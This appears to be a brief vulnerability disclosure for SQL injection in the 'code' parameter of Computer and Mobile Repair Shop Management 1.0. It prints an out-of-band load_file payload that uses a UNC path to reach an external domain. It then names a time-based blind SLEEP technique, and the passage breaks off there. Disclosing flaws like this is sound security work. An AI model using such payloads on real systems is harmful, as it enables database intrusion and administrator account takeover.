## Description:
The `code` parameter from /rsms/ node app, on Computer and Mobile Repair Shop Management-1.0 appears to be vulnerable to SQL injection attacks. 
The payload '+(select load_file('\\\\uhf36ut6xyf0s9amr8axy7o8ezks8jwazyqlh96.nu11secur1tyPenetrationTestingEngineer.net\\kie'))+' was submitted in the code parameter. 
This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. 
The application interacted with that domain, indicating that the injected SQL query was executed.
The attacker can take administrator account control on this system.

[+] Payloads:

```mysql

Parameter: code (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
